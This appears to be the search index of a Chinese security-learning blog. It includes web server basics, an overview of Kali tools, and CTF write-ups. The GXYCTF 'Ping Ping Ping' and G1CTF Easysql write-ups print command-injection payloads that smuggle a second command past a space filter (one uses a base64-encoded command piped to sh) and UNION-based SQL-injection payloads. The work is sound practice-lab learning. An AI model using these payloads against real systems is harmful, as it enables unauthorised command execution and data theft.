<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>first blog</title>
    <url>/2021/07/03/first-blog/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/07/03/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>Hello World.md</title>
    <url>/2021/07/04/wlb/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>helloworld</category>
      </categories>
      <tags>
        <tag>hello</tag>
        <tag>world</tag>
      </tags>
  </entry>
  <entry>
    <title>Web服务器.md</title>
    <url>/2021/07/04/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="Web服务器通信原理"><a href="#Web服务器通信原理" class="headerlink" title="Web服务器通信原理"></a>Web服务器通信原理</h2><p><img src="https://image.3001.net/images/20210602/1622596790_60b6dcb6aa7b74f369a83.png!small?1622596792210" alt="1622596790_60b6dcb6aa7b74f369a83.png!small?1622596792210"></p>
<span id="more"></span>

<h3 id="一-基础知识介绍"><a href="#一-基础知识介绍" class="headerlink" title="一.基础知识介绍"></a>一.基础知识介绍</h3><p><strong>常见的服务器系统:</strong></p>
<p><img src="https://image.3001.net/images/20210601/1622545831_60b615a7b3ceb4ab1be6b.png!small?1622545830280" alt="1622545831_60b615a7b3ceb4ab1be6b.png!small?1622545830280"></p>
<p><strong>Windows</strong>和<strong>Linux</strong>的区别:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows的路径:C:\Windows\Help&gt;</span><br><span class="line">Linux的路径:/etc/init#</span><br></pre></td></tr></table></figure>

<p>看到看到<strong>盘符</strong>一定是WINDOWS，看到**/**开头一般都是LIUNX( 拿macOS做系统很罕见)</p>
<p><strong>绝对路径,相对路径</strong></p>
<blockquote>
<p>绝对路径:文件在硬盘上真正存在的路径</p>
<p>相对路径:自己相对与目标位置</p>
</blockquote>
<p><strong>CMD命令</strong></p>
<p><strong>渗透测试</strong>常用的Cmd命令:</p>
<blockquote>
<p>dir 显示当前目录</p>
<p>net user查看</p>
<p>cd 跳转XX目录</p>
<p>systeminfo 查看计算机信息</p>
<p>ipconfig 查询自己的ip地址</p>
</blockquote>
<p><strong>网络知识方面</strong></p>
<p><strong>IP</strong>  :内网IP和公网IP;</p>
<p>判断方法:(知道内网地址了,其他的就是公网地址)</p>
<blockquote>
<p><strong>内网地址</strong>取值范围:</p>
<p><strong>A类</strong>：10.0.0.0-10.255.255.255</p>
<p><strong>B类</strong>：172.16.0.0-172.31.255.25</p>
<p><strong>C类</strong>：192.168.0.0-192.168.255.255</p>
</blockquote>
<p><strong>DNS(域名系统)</strong> :</p>
<blockquote>
<p><strong>域名</strong>实际上是为了方便记忆所发明的一个字符型标识</p>
<p><strong>DSN</strong> 将域名转化为ip的一个协议<br><strong>子域名</strong>: 顶级域名、二级域名、三级域名.(几个点就是几级)</p>
</blockquote>
<p><img src="https://image.3001.net/images/20210601/1622551538_60b62bf2d9069ce839602.png!small?1622551537377" alt="1622551538_60b62bf2d9069ce839602.png!small?1622551537377"></p>
<p><strong>端口(port)</strong>  :</p>
<blockquote>
<p>每个端口对应不同的服务</p>
<p><strong>范围</strong>是从0 到65535（2^16-1）</p>
</blockquote>
<p><img src="https://image.3001.net/images/20210601/1622551744_60b62cc0695cf2f185f9b.png!small?1622551742877" alt="1622551744_60b62cc0695cf2f185f9b.png!small?1622551742877"></p>
<p>**HTTP协议(*<em>超文本传输协议*</em>)**:</p>
<blockquote>
<p>是互联网上应用最为广泛的一种网络协议</p>
<p>设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法,访问网站大都是用HTTP协议</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTTP数据包的简介:</span><br><span class="line">GET / HTTP/1.1                                   #GET是请求方式  HTTP/1.1是协议版本Host: node3.buuoj.cn:25028                       #Host是访问的域名User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36              #告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9    #浏览器端可以接受的媒体类型Accept-Encoding: gzip, deflate                       #浏览器申明自己接收的编码方法Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7   #浏览器申明自己接收的字符集</span><br></pre></td></tr></table></figure>

<h3 id="网页浏览的流程"><a href="#网页浏览的流程" class="headerlink" title="网页浏览的流程"></a>网页浏览的流程</h3><p><strong>访客角度分析</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入协议://域名访问==&gt;DNS服务器找对应IP==&gt;IP收到请求,进行处理返回结果给你==&gt;浏览器将结果处理展示给你看</span><br></pre></td></tr></table></figure>

<blockquote>
<p>一.  用户在浏览器输入协议://域名,</p>
<p>二. 用户浏览器通过系统 → 向DNS服务器查询域名对应的IP地址</p>
<p>三. 用户浏览器向查询到的IP地址(Web服务器)发起HTTP请求</p>
<p>四. 服务器分析用户请求，从中提取数据，处理后返回一个http响应</p>
<p>五. 浏览器收到响应后提取状态、协议编码、正文的有效信息，然后翻译成人类能够直观理解的图形界面并显示</p>
</blockquote>
<h3 id="Web容器"><a href="#Web容器" class="headerlink" title="Web容器:"></a>Web容器:</h3><blockquote>
<p>Web容器可以向发出请求的浏览器提供文档的程序。</p>
<p>WEB容器是一种被动程序：只有其他计算机发出的请求该容器时，容器才会响应。</p>
<p>Web容器的主要功能是存储，处理和传递网页给客户。客户端和服务器之间的通信使用超文本传输协议（HTTP）进行。交付的页面最常见的是HTML文档，除了文本内容之外，还可能包含图像，样式表和脚本。</p>
</blockquote>
<p><img src="https://image.3001.net/images/20210601/1622558048_60b6456062d2dee286c09.png!small?1622558046637" alt="1622558048_60b6456062d2dee286c09.png!small?1622558046637"></p>
<p><img src="https://image.3001.net/images/20210601/1622558051_60b645633babf5c1f4a71.png!small?1622558049521" alt="1622558051_60b645633babf5c1f4a71.png!small?1622558049521"></p>
<p><strong>Web容器</strong>的解析：</p>
<p><img src="https://image.3001.net/images/20210602/1622604346_60b6fa3ad3b34015dc7bc.png!small?1622604349733" alt="1622604346_60b6fa3ad3b34015dc7bc.png!small?1622604349733"></p>
<h2 id="快速自建web安全测试环境"><a href="#快速自建web安全测试环境" class="headerlink" title="快速自建web安全测试环境"></a>快速自建web安全测试环境</h2><h3 id="什么是动态语言"><a href="#什么是动态语言" class="headerlink" title="什么是动态语言"></a>什么是动态语言</h3><p><strong>动态语言</strong>是对<strong>服务器行为的编程</strong>。这被称为<strong>服务器端脚本或服务器脚本</strong>。</p>
<p><img src="https://image.3001.net/images/20210602/1622604068_60b6f9244ce4ef47a9cbf.png!small?1622604068413" alt="1622604068_60b6f9244ce4ef47a9cbf.png!small?1622604068413"></p>
<p><strong>常见的服务器脚本</strong>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Asp,Aspx(windows);</span><br><span class="line">PHP(全平台);</span><br><span class="line">JSP(全平台)（java）</span><br><span class="line">python(全平台)</span><br></pre></td></tr></table></figure>

<p>动态语言<strong>能做什么</strong>：</p>
<blockquote>
<p>1.动态地向 web 页面<strong>编辑、改变或添加</strong>任何的内容</p>
<p>2.对由 HTML 表单提交的用户请求或数据<strong>进行响应</strong> </p>
<p>3.<strong>访问</strong>数据或数据库，并向浏览器返回结果</p>
<p>4.为<strong>不同的用户</strong>定制页面</p>
<p>5.提高<strong>网页安全性</strong>，使您的网页代码不会通过浏览器被查看到</p>
</blockquote>
<h3 id="服务器环境的快速搭建"><a href="#服务器环境的快速搭建" class="headerlink" title="服务器环境的快速搭建"></a>服务器环境的快速搭建</h3><p><strong>常见服务器</strong>快速搭建的软件:</p>
<blockquote>
<p><strong>JSP(Tomcat)</strong> </p>
<p><strong>PHP(PHPStudy)</strong> <strong>windows</strong> </p>
<p><strong>PHP(lnmp) linux</strong>  </p>
<p><strong>宝塔、Lamp</strong> </p>
</blockquote>
<h3 id="PhPstudy功能介绍"><a href="#PhPstudy功能介绍" class="headerlink" title="PhPstudy功能介绍"></a>PhPstudy功能介绍</h3><p>PHPStudy使用说明教程:   <a href="https://www.php.cn/phpstudy-377909.html">https://www.php.cn/phpstudy-377909.html</a></p>
<h3 id="快速搭建一个网站-通过CMS"><a href="#快速搭建一个网站-通过CMS" class="headerlink" title="快速搭建一个网站(通过CMS)"></a>快速搭建一个网站(通过CMS)</h3><blockquote>
<p><strong>CMS</strong>意为”内容管理系统”,实际上就是一个<strong>快速建站的模板</strong>，常见的CMS有织梦、Dz论坛等</p>
<p><strong>获取CMS源码方式：</strong>可以去<strong>官方下载</strong>也可以去一些<strong>源码交流论坛</strong>还可以去<strong>github</strong>下载</p>
</blockquote>
<p><strong>织梦CMS</strong>：<a href="http://www.dedecms.com/products/dedecms/downloads/">http://www.dedecms.com/products/dedecms/downloads/ </a></p>
<blockquote>
<p>CMS源码解压后放入<strong>WWW目录</strong>，然后直接去访问<strong>upload文件夹</strong>，然后可以直接进入<strong>安装引导</strong></p>
<p>安装过程仅仅只需要你输入<strong>数据库密码</strong>就可以安装成功了</p>
<p><strong>install 文件夹</strong> </p>
</blockquote>
<p><img src="https://image.3001.net/images/20210602/1622610443_60b7120b36e4506e29553.png!small?1622610443324" alt="1622610443_60b7120b36e4506e29553.png!small?1622610443324"></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>渗透测试学习</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试kali Linux常用工具</title>
    <url>/2021/07/05/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95kali-Linux%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p><img src="https://image.3001.net/images/20210521/1621571329_60a73701d9767251e4748.png!small" alt="img"></p>
<p><strong>kali Linux工具帮你评估 Web 服务器的安全性，并帮助你执行黑客渗透测试。</strong></p>
<h3 id="注意：这里不是所提及的所有工具都是开源的。"><a href="#注意：这里不是所提及的所有工具都是开源的。" class="headerlink" title="注意：这里不是所提及的所有工具都是开源的。"></a><strong>注意：这里不是所提及的所有工具都是开源的。</strong></h3><span id="more"></span>

<h2 id="1-Nmap"><a href="#1-Nmap" class="headerlink" title="1. Nmap"></a>1. Nmap</h2><p><img src="https://image.3001.net/images/20210520/1621507756_60a63eac521c0abeb99bc.png!small?1621507755558" alt="1621507756_60a63eac521c0abeb99bc.png!small?1621507755558"></p>
<p><strong>Nmap</strong>（<strong>网络映射器</strong>）是一款用于<strong>网络发现</strong>和<strong>安全审计</strong>的<strong>网络安全</strong>工具.</p>
<p><a href="https://zh.wikipedia.org/wiki/Nmap#Nmap_%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD">核心功能</a><strong><a href="https://zh.wikipedia.org/wiki/Nmap#Nmap_%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD">:  主机发现,端口扫描,版本侦测,操作系统侦测,防火墙/IDS规避和哄骗</a></strong></p>
<p>Nmap 基本语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap [ &lt;扫描类型&gt; ...] [ &lt;选项&gt; ] &#123; &lt;扫描目标说明&gt; &#125;</span><br></pre></td></tr></table></figure>

<p><strong>全面进攻性</strong>扫描（包括各种主机发现、端口扫描、版本扫描、OS扫描及默认脚本扫描）:</p>
<p>nmap -A -v target_ip</p>
<p><strong>ping</strong>扫描:    nmap -sn -v target_ip</p>
<p><strong>快速端口</strong>扫描:nmap -F -v target_ip</p>
<p><strong>版本</strong>扫描:    nmap -sV -v target_ip</p>
<p><strong>操作系统</strong>扫描:nmap -O -v target_ip</p>
<h2 id="2-Wireshark"><a href="#2-Wireshark" class="headerlink" title="2. Wireshark"></a>2. Wireshark</h2><p><img src="https://image.3001.net/images/20210520/1621519865_60a66df98359498712be9.png!small?1621519864772" alt="1621519865_60a66df98359498712be9.png!small?1621519864772"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><strong>Wireshark的</strong>是一个<a href="https://en.wikipedia.org/wiki/Free_software">自由</a>和<a href="https://en.wikipedia.org/wiki/Open-source_software">开源</a><a href="https://en.wikipedia.org/wiki/Packet_analyzer">数据包分析器,是 Kali Linux 上最受欢迎的网络分析仪。</a></p>
<p><strong>Wireshark</strong>使用WinPCAP作为接口，直接与<strong>网卡</strong>进行<strong>数据报文交换。</strong></p>
<h2 id="3-Metasploit-Framework"><a href="#3-Metasploit-Framework" class="headerlink" title="3. Metasploit Framework"></a>3. Metasploit Framework</h2><p><img src="https://image.3001.net/images/20210520/1621522244_60a67744d96353fc7a85a.png!small?1621522243943" alt="1621522244_60a67744d96353fc7a85a.png!small?1621522243943"></p>
<p><strong>Metasploit Framework</strong>是一个旨在提供<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全漏洞信息</a>计算机安全项目，可以协助安全工程师进行<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>（penetration testing）及<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F">入侵检测系统</a>签名开发。</p>
<p><strong>Metasploit Framework</strong>最为知名的子项目是<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%94%BE%E6%BA%90%E4%BB%A3%E7%A0%81">开源</a>的Metasploit框架，一套针对远程主机进行开发和执行“<a href="https://zh.wikipedia.org/wiki/Exploit">exploit</a>代码”的工具</p>
<p>使用<strong>Metasploit框架</strong>的基本步骤包括：</p>
<p>选择并配置一个攻击代码(exploit, 利用<a href="https://zh.wikipedia.org/wiki/%E6%BC%8F%E6%B4%9E">漏洞</a>来进入目标系统的代码）；</p>
<p>检查目标系统是否会被此代码影响；</p>
<p>选择并配置一个<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD">有效负载</a>(payload, 在成功进入后在目标系统上执行的代码）；</p>
<p>选择编码方式，使<a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E9%A2%84%E9%98%B2%E7%B3%BB%E7%BB%9F">入侵预防系统</a>，忽略已被编码的有效负载；</p>
<p>执行攻击代码。</p>
<h2 id="4-Hydra"><a href="#4-Hydra" class="headerlink" title="4.Hydra"></a>4.Hydra</h2><p><img src="https://image.3001.net/images/20210521/1621557142_60a6ff96c05efacb613fa.png!small?1621557141539" alt="1621557142_60a6ff96c05efacb613fa.png!small?1621557141539"></p>
<p><strong>Hydra</strong>是<a href="https://en.wikipedia.org/wiki/Parallel_computing">并行化的</a>网络<a href="https://en.wikipedia.org/wiki/Password_cracking">登录破解程序，</a>内置于各种操作系统中。</p>
<p><strong>Hydra</strong>通过使用<a href="https://en.wikipedia.org/wiki/Brute-force_attacks">暴力攻击</a>，猜测正确的用户名和<a href="https://en.wikipedia.org/wiki/Password">密码</a>。</p>
<p><strong>kali</strong>下是默认安装的，几乎支持<strong>所有协议</strong>的在线破解</p>
<h2 id="5-Aircrack-ng"><a href="#5-Aircrack-ng" class="headerlink" title="5.Aircrack-ng"></a>5.Aircrack-ng</h2><p><img src="https://image.3001.net/images/20210521/1621558601_60a705494e04e16c4a9ea.png!small?1621558601612" alt="1621558601_60a705494e04e16c4a9ea.png!small?1621558601612"></p>
<p><strong>Aircrack-ng</strong>是一个与<a href="https://zh.wikipedia.org/wiki/802.11">802.11</a>标准的无线网络分析有关的安全软件，主要功能有：网络侦测，<a href="https://zh.wikipedia.org/wiki/%E5%97%85%E6%8E%A2">数据包嗅探</a>，<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86">WEP</a>和<a href="https://zh.wikipedia.org/wiki/WPA">WPA</a>/<a href="https://zh.wikipedia.org/w/index.php?title=WPA2-PSK&action=edit&redlink=1">WPA2-PSK</a>破解。</p>
<p><strong>Aircrack-ng可以</strong>用于<strong>监视</strong>，<strong>收集</strong>有关WiFi的信息SSID（服务集标识符）IP和MAC地址以及WiFi的破解密码</p>
<h2 id="6-Nessus"><a href="#6-Nessus" class="headerlink" title="6.Nessus"></a>6.Nessus</h2><p><img src="https://image.3001.net/images/20210521/1621559138_60a70762f130c4c142c9d.png!small?1621559139366" alt="1621559138_60a70762f130c4c142c9d.png!small?1621559139366"></p>
<p><strong>Nessus</strong>为一款<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F">系统</a>弱点<a href="https://zh.wikipedia.org/wiki/%E6%89%AB%E6%8F%8F">扫描</a>与分析软件。能够协助<strong>检测和修复</strong>各种操作系统、应用程序、乃至设备上的漏洞、恶意软件、配置错误、及补丁的缺失。</p>
<p>但是，它不再是免费的工具了，免费的功能受限制。</p>
<h2 id="7-WafW00f"><a href="#7-WafW00f" class="headerlink" title="7.WafW00f"></a>7.WafW00f</h2><p><img src="https://image.3001.net/images/20210521/1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391" alt="1621566853_60a72585ab7ca2a6138c3.png!small?1621566854391"></p>
<p>**Wafw00f –**防火墙检测工具，</p>
<p><strong>Wafw00f</strong> 使用一组HTTP请求和方法查询Web服务器,分析来自它们的响应并检测防火墙</p>
<h2 id="8-Burp-Suite"><a href="#8-Burp-Suite" class="headerlink" title="8. Burp Suite"></a>8. Burp Suite</h2><p><img src="https://image.3001.net/images/20210520/1621526092_60a6864c6294e11a17405.png!small?1621526091423" alt="1621526092_60a6864c6294e11a17405.png!small?1621526091423"></p>
<p><strong>Burp Suite</strong>是一个用于测试网络应用程序安全性的图形化工具，出色的网络安全分析工具。</p>
<p><strong>主要模块</strong>介绍:</p>
<p><strong>HTTP代理</strong>— 它作为一个 Web 代理服务器运行，并且位于浏览器和目标 Web 服务器之间。这允许拦截、检查和修改在两个方向上通过的原始流量。</p>
<p><strong>Scanner</strong>(扫描器)— 一个 Web 应用程序安全扫描器，用于执行 Web 应用程序的自动漏洞扫描。</p>
<p><strong>Intruder</strong>(入侵)— 此工具可以对 Web 应用程序执行自动攻击。该工具提供了一种可配置的<a href="https://zh.wikipedia.org/wiki/%E7%AE%97%E6%B3%95">算法</a>，可以生成恶意 HTTP 请求。Intruder 工具可以测试和检测 <a href="https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A">SQL 注入</a>、<a href="https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC">跨站脚本</a>、参数篡改和易受蛮力攻击的漏洞。</p>
<p>**Spider(蜘蛛)**— 一个自动抓取 Web 应用程序的工具。</p>
<p>**Repeater(中继器)**— 一个可以用来手动测试应用程序的简单工具。它可以用于修改对服务器的请求，重新发送它们并观察结果。</p>
<p><strong>Decoder</strong>(解码器)— 一种将已编码的数据转换为其规范形式，或将原始数据转换为各种编码和散列形式的工具。它能够利用启发式技术智能识别多种编码格式。</p>
<p><strong>Comparer</strong>(比较)— 在任意两个数据项之间执行比较（一个可视化的“差异”）的工具。</p>
<p><strong>Extender</strong>(扩展)— 允许安全测试人员加载 Burp 扩展，使用安全测试人员自己的或第三方代码扩展 Burp 的功能</p>
<p><strong>Sequencer</strong>(会话)— 一种分析数据项样本随机性的工具。它可以用于测试应用程序的会话令牌或其他重要的数据项，如反 CSRF 令牌、密码重置令牌等。</p>
<h2 id="9-Maltego"><a href="#9-Maltego" class="headerlink" title="9.Maltego"></a>9.Maltego</h2><p><img src="https://image.3001.net/images/20210521/1621568089_60a72a59da57f1f4697a9.png!small?1621568090170" alt="1621568089_60a72a59da57f1f4697a9.png!small?1621568090170"></p>
<p><strong>Maltego</strong>–是一个<strong>开源情报</strong>（OSINT）和<strong>图形链接分析</strong>工具,用于<strong>收集和连接</strong>用于调查任务的信息。</p>
<p><strong>Maltego  以简单,智能,功能强大受安全人员喜爱。</strong></p>
<h2 id="10-W3AF"><a href="#10-W3AF" class="headerlink" title="10.W3AF"></a>10.W3AF</h2><p><img src="https://image.3001.net/images/20210521/1621570653_60a7345de36022a563727.png!small?1621570654103" alt="1621570653_60a7345de36022a563727.png!small?1621570654103"></p>
<p><strong>W3AF</strong>是一个<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E6%BA%90">开源</a>的Web应用程序安全扫描器。该项目为<a href="https://zh.wikipedia.org/wiki/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">Web应用程序</a>提供了一个漏洞扫描器和漏洞利用工具。它提供了有关<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3">安全性漏洞</a>的信息，以便在<a href="https://zh.wikipedia.org/wiki/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95">渗透测试</a>项目中使用</p>
<p><strong>W3AF</strong>能用Web应用程序攻击和审核框架的Arconym，来查找网站中的缺陷</p>
<h2 id="11-Wpscan"><a href="#11-Wpscan" class="headerlink" title="11.Wpscan"></a>11.Wpscan</h2><p><img src="https://image.3001.net/images/20210521/1621571845_60a7390565d22fd5ad546.png!small?1621571846484" alt="1621571845_60a7390565d22fd5ad546.png!small?1621571846484"></p>
<p><strong>Wpscan</strong>是Kali Linux 自带的一款漏洞扫描工具，它采用Ruby 编写，能够扫描WordPress 网站中的多种安全漏洞，它可以为所有Web开发人员扫描 WordPress漏洞并在他们开发前找到并解决问题。</p>
<p>WordPress（WP，WordPress.org）是一个<a href="https://en.wikipedia.org/wiki/Free_and_open-source_software">免费的开源</a><a href="https://en.wikipedia.org/wiki/Content_management_system">内容管理系统</a>（CMS）</p>
<h2 id="12-sqlmap"><a href="#12-sqlmap" class="headerlink" title="12.sqlmap"></a>12.sqlmap</h2><p><img src="https://image.3001.net/images/20210521/1621573031_60a73da7e023739dc8878.png!small?1621573033546" alt="1621573031_60a73da7e023739dc8878.png!small?1621573033546"></p>
<p><strong>sqlmap</strong>是一个开源的渗透测试工具，可以用来进行自动化检测，能自动化利用 SQL 注入漏洞的过程，帮助你接管数据库服务器</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Kali linux</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 PingPingping</title>
    <url>/2021/07/05/GXYCTF/</url>
    <content><![CDATA[<h2 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h2><p>进入题目<img src="https://image.3001.net/images/20210519/1621431470_60a514ae22660b55f09d7.png!small" alt="img"></p>
<span id="more"></span>

<p>肯定先Ping一下本地IP:127.0.0.1<br><img src="https://image.3001.net/images/20210519/1621431470_60a514aec2d656d3179be.png!small" alt="img">能连接上</p>
<p>然后用<strong>ls</strong>关键字列出当前目录的内容</p>
<p><img src="https://image.3001.net/images/20210519/1621431914_60a5166ab09adfcf9393c.png!small?1621431914356" alt="1621431914_60a5166ab09adfcf9393c.png!small?1621431914356">接着我们肯定想查看flag.php里面的值<br>用<strong>cat</strong>命令查看文件内容,<br>还有其他查看命令主要是tac,head,more,tail,less<br><img src="https://image.3001.net/images/20210519/1621431472_60a514b0e3834c943a421.png!small" alt="img">显示空格被过滤了；<br>一般空格过滤绕过的方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag&#125;;   $&#123;IFS$;   $IFS$9;   &lt;;   &lt;&gt;;</span><br></pre></td></tr></table></figure>

<p>经过测试用空格用**$IFS$9<strong>绕过;<br>然后变量</strong>拼接,倒序**得到payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=ag;b=fl;cat$IFS$1$b$a.php</span><br><span class="line">也可以?ip=127.0.0.1;a=lag;cat$IFS$9f$a.php</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210519/1621432029_60a516ddb83e9343a6f5d.png!small?1621432029374" alt="1621432029_60a516ddb83e9343a6f5d.png!small?1621432029374"></p>
<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><p>内联执行绕过<br>将<strong>反引号内</strong>命令的输出作为输入执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=|cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<h3 id="解法3"><a href="#解法3" class="headerlink" title="解法3:"></a>解法3:</h3><p>虽然过滤了bash，但没过滤sh,可以使用下面的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=1;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</span><br></pre></td></tr></table></figure>

<p>推荐写的<em><strong>很好</strong></em>的关于此类题目的文章</p>
<p><a href="https://www.codenong.com/cs105422347/">https://www.codenong.com/cs105422347/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
        <category>GXYCTF 2019</category>
      </categories>
      <tags>
        <tag>GXYCTF 2019</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 Easysql</title>
    <url>/2021/07/05/G1CTF2021-Easysql/</url>
    <content><![CDATA[<p>映入眼帘的是<img src="https://image.3001.net/images/20210524/1621860284_60ab9fbc6d7d65a5de710.png!small" alt="1621860284_60ab9fbc6d7d65a5de710.png!small"></p>
<p>告诉了我们flag在 <strong>flag表里的flag字段</strong></p>
<p>在框里<strong>输入数字</strong>有<strong>回显</strong></p>
<span id="more"></span>

<p><img src="https://image.3001.net/images/20210524/1621860665_60aba139a844128cfc8a3.png!small" alt="1621860665_60aba139a844128cfc8a3.png!small"></p>
<p>说明用户输入的数据被当做<strong>sql代码</strong>执行了</p>
<p>说明这里存在<strong>sql注入</strong></p>
<p>页面显示 hacker!</p>
<p>说明<strong>空格</strong>被过滤了</p>
<p>sql注入绕过<strong><strong>空格</strong></strong>的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释符/**/，%a0      </span><br></pre></td></tr></table></figure>

<p><strong>sql注入绕过技巧推荐:</strong> <a href="https://www.cnblogs.com/Vinson404/p/7253255.html">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p>
<p>判断当前页面的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/order/**/by/**/1,2,3,4.....</span><br></pre></td></tr></table></figure>

<p>经测试<strong>字段数为3</strong></p>
<p>然后<strong>联合查询</strong>注入得flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,2,flag/**/from/**/flag#</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20210525/1621939518_60acd53ee79bfe5706343.png!small" alt="1621939518_60acd53ee79bfe5706343.png!small"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>G1CTF2021</category>
      </categories>
      <tags>
        <tag>G1CTF2021</tag>
      </tags>
  </entry>
  <entry>
    <title>G1CTF2021 Babysql</title>
    <url>/2021/07/05/G1CTF2021-Babysql/</url>
    <content><![CDATA[<p>babysql是  <strong>easysql</strong>的加强版</p>
<p><a href="articles/network/274461.html">https://www.freebuf.com/articles/network/274461.html</a></p>
<p>尝试输入一下东西只回显 <strong>search success和hacker!</strong></p>
<p>典型的布尔盲注：</p>
<span id="more"></span>

<p><img src="https://image.3001.net/images/20210529/1622273246_60b1ecde96a511f946fd2.png!small" alt="1622273246_60b1ecde96a511f946fd2.png!small"></p>
